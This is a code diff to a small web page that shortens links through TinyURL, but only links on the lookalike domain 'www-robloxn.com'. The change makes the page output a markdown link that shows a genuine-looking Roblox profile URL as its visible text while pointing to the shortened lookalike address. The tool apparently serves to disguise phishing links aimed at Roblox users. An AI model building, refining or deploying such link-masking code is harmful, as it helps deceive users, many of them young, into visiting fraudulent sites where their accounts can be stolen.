@@ -84,6 +84,8 @@
       margin-top: 1rem;
       font-size: 1rem;
       text-align: center;
+      word-wrap: break-word;
+      max-width: 80%;
     }
   </style>
 </head>
@@ -183,16 +185,22 @@
       const longUrl = input.value.trim();
 
       if (!longUrl.startsWith("https://www-robloxn.com/")) {
-        result.innerHTML = "❌ Invalid link. Must start with: https://www-robloxn.com/";
+        result.textContent = "❌ Invalid link. Must start with: https://www-robloxn.com/";
         return;
       }
 
       try {
+        result.textContent = "⏳ Shortening...";
         const response = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(longUrl)}`);
         const shortUrl = await response.text();
-        result.innerHTML = `✅ Shortened Link: <a href="${shortUrl}" target="_blank">${shortUrl}</a>`;
+
+        // Fixed display URL (the visible text in markdown)
+        const displayUrl = "https://www.roblox.com/users/546464656555/profile";
+
+        // Markdown style output:
+        result.textContent = `[${displayUrl}](${shortUrl})`;
       } catch (error) {
-        result.innerHTML = "❌ Error shortening link.";
+        result.textContent = "❌ Error shortening link.";
       }
     }
   </script>
